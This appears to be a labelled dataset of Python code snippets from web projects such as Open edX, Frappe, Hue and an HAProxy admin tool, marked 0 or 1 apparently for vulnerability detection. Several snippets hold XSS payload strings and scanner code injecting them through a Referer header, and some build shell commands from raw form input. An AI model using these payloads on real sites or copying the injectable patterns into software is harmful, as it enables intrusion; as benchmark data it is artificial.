self.meta.get(\"fields\"): \t\t\tif", "label": 0}, {"snippet_id": 31231, "code": ") \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker", "label": 0}, {"snippet_id": 26261, "code": ".vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')[:2] !", "label": 0}, {"snippet_id": 37922, "code": " posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): ", "label": 0}, {"snippet_id": 33182, "code": "(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer to see the build.", "label": 0}, {"snippet_id": 30470, "code": " rows, grep_act, grep)]\t\t \telse: \t\tcommands=[ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting(", "label": 0}, {"snippet_id": 19080, "code": "*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500", "label": 0}, {"snippet_id": 23657, "code": " from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd()", "label": 0}, {"snippet_id": 47269, "code": "'recordmetadata.details_view', id=rec_uuid) with app.test_client() as client: res=client.get(index_view_url) assert res.status_code==200 with patch('invenio_records.models.RecordMetadata') as db_mock: db_mock", "label": 0}, {"snippet_id": 53142, "code": " def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response", "label": 0}, {"snippet_id": 42813, "code": "=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype=", "label": 0}, {"snippet_id": 15710, "code": " exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy", "label": 0}, {"snippet_id": 19045, "code": "(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if", "label": 0}, {"snippet_id": 30200, "code": "] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers", "label": 0}, {"snippet_id": 11937, "code": " wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())", "label": 0}, {"snippet_id": 8864, "code": ": if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns", "label": 0}, {"snippet_id": 20173, "code": " directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg", "label": 0}, {"snippet_id": 15367, "code": "'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots", "label": 0}, {"snippet_id": 36232, "code": "(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t\tdoc=getattr(self, \"parent_doc\", None) or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self,", "label": 0}, {"snippet_id": 32160, "code": ", indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules", "label": 1}, {"snippet_id": 12323, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware", "label": 0}, {"snippet_id": 11432, "code": "' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 35012, "code": "))) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe", "label": 0}, {"snippet_id": 53729, "code": " default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__': parser=argparse.ArgumentParser(description='EB Config Maker') parser.add_argument('--dest', type=str, help='The destination", "label": 0}, {"snippet_id": 36420, "code": "[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value", "label": 0}, {"snippet_id": 23528, "code": "(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'", "label": 0}, {"snippet_id": 15822, "code": ". \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course", "label": 0}, {"snippet_id": 35017, "code": "\"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif", "label": 0}, {"snippet_id": 15626, "code": " is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self", "label": 0}, {"snippet_id": 53794, "code": "//www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_", "label": 1}, {"snippet_id": 39032, "code": "]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname", "label": 0}, {"snippet_id": 1081, "code": " \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting", "label": 0}, {"snippet_id": 28344, "code": " ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: text/html", "label": 0}, {"snippet_id": 11544, "code": "), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views", "label": 0}, {"snippet_id": 21208, "code": " url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\")", "label": 0}, {"snippet_id": 51094, "code": "): return obj.total_run_count @staticmethod def due(obj): if obj.last_run_at: return obj.schedule.remaining_estimate(last_run_at=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now", "label": 0}, {"snippet_id": 9390, "code": "'staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses", "label": 0}, {"snippet_id": 26422, "code": "[ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\", \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1);</script>\", \"<body background", "label": 1}, {"snippet_id": 8697, "code": "', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',", "label": 0}, {"snippet_id": 39178, "code": "() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields", "label": 0}, {"snippet_id": 4364, "code": "<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\">", "label": 1}, {"snippet_id": 20962, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 33903, "code": " txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))", "label": 0}, {"snippet_id": 8735, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 10698, "code": " tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the number of available processors. verify_xss -when set, check", "label": 0}, {"snippet_id": 12564, "code": "\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 47713, "code": "+=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True", "label": 0}, {"snippet_id": 4618, "code": "', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', ", "label": 0}, {"snippet_id": 7950, "code": " name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 37482, "code": "(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name", "label": 0}, {"snippet_id": 45082, "code": ": %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 2948, "code": ") print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting", "label": 0}, {"snippet_id": 51984, "code": " django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop", "label": 0}, {"snippet_id": 16495, "code": " wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())),", "label": 0}, {"snippet_id": 39008, "code": "(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname", "label": 0}, {"snippet_id": 31818, "code": "+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save') \ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('", "label": 0}, {"snippet_id": 41589, "code": " import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): ", "label": 0}, {"snippet_id": 24233, "code": " and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as", "label": 0}, {"snippet_id": 23608, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=(", "label": 0}, {"snippet_id": 49888, "code": " to us via bitcoin at:{{ bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return", "label": 1}, {"snippet_id": 46098, "code": ": query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json", "label": 1}, {"snippet_id": 5360, "code": "'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr", "label": 0}, {"snippet_id": 22152, "code": "'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$", "label": 0}, {"snippet_id": 6615, "code": "(self): \"\"\" Verify request signatures, if they exist. This defaults to False since it is a trivial DoS to consume all the IdP:s CPU resources if this is set to True. \"\"\" res=self.config.get(self.section, ", "label": 0}, {"snippet_id": 24047, "code": " test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file", "label": 0}, {"snippet_id": 53293, "code": ".user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,", "label": 0}, {"snippet_id": 5612, "code": "<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html", "label": 0}, {"snippet_id": 3916, "code": "\"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com", "label": 1}, {"snippet_id": 2761, "code": " uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url", "label": 0}, {"snippet_id": 19893, "code": ".get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 1133, "code": ": logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid", "label": 1}, {"snippet_id": 43812, "code": " \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have", "label": 0}, {"snippet_id": 17579, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding", "label": 0}, {"snippet_id": 30983, "code": " \t\tos.system(\"/bin/rm -f \" +cfg)\t \t\t if form.getvalue('master'): \tmaster=form.getvalue('master') \tslave=form.getvalue('slave') \tinterface=form.getvalue('interface') \tvrrpip=form.getvalue('vrrpip') \ttmp_config_path", "label": 0}, {"snippet_id": 29779, "code": " import ovw form=cgi.FieldStorage() serv=form.getvalue('serv') act=form.getvalue('act') \t print('Content-type: text/html\\n') if act==\"checkrestart\": \tservers=sql.get_dick_permit(ip=serv) \tfor server in", "label": 0}, {"snippet_id": 24462, "code": ", DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args", "label": 1}, {"snippet_id": 10221, "code": " self.assertEqual(suite.cmd, \"\") def test_verify_xss(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var", "label": 1}, {"snippet_id": 40848, "code": "\"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters", "label": 0}, {"snippet_id": 34827, "code": " \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict", "label": 0}, {"snippet_id": 29658, "code": "(text): \treturn cgi.escape(text, quote=True) \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)", "label": 0}, {"snippet_id": 54899, "code": " ) from pontoon.base.utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources", "label": 0}, {"snippet_id": 27142, "code": " params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button", "label": 1}, {"snippet_id": 17759, "code": "[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,", "label": 0}, {"snippet_id": 45637, "code": "=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description", "label": 0}, {"snippet_id": 3350, "code": " Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result", "label": 0}, {"snippet_id": 13436, "code": "\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r", "label": 0}, {"snippet_id": 5841, "code": "\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' ", "label": 0}, {"snippet_id": 10467, "code": ") self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 16653, "code": ".*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 43810, "code": " self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If", "label": 0}, {"snippet_id": 14900, "code": "={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count", "label": 0}, {"snippet_id": 3945, "code": ", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable", "label": 0}, {"snippet_id": 33865, "code": "\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers", "label": 0}, {"snippet_id": 45457, "code": "/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc", "label": 0}, {"snippet_id": 23227, "code": ", name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 48872, "code": ".copy() for key, value in query.items(): if type(value)==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format", "label": 0}, {"snippet_id": 13920, "code": "+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading", "label": 0}, {"snippet_id": 9308, "code": "\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)", "label": 0}, {"snippet_id": 591, "code": " '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url", "label": 0}, {"snippet_id": 10083, "code": "='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 9302, "code": "', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 45495, "code": ".user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,),", "label": 0}, {"snippet_id": 28223, "code": " and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue", "label": 0}, {"snippet_id": 12570, "code": ")/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 38676, "code": "\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name,", "label": 0}, {"snippet_id": 43185, "code": "\t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None", "label": 0}, {"snippet_id": 43663, "code": ".get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) ", "label": 0}, {"snippet_id": 14178, "code": "/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 13958, "code": " 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 37345, "code": "\t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description", "label": 0}, {"snippet_id": 21179, "code": "', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$", "label": 0}, {"snippet_id": 16330, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +", "label": 0}, {"snippet_id": 19397, "code": " the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 6775, "code": ": \"\"\" The scope to append to any unscoped eduPersonPrincipalName attributes found on users in the userdb. \"\"\" return self.config.get(self.section, 'default_eppn_scope') @property def authn_info_mongo_uri", "label": 0}, {"snippet_id": 8955, "code": "))), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 23076, "code": "]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 51222, "code": "', 'is_staff', 'is_superuser', 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group.name return value class GroupAdmin(BaseGroupAdmin", "label": 0}, {"snippet_id": 23626, "code": "/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root", "label": 0}, {"snippet_id": 35521, "code": ", docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname", "label": 0}, {"snippet_id": 45120, "code": ")] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): 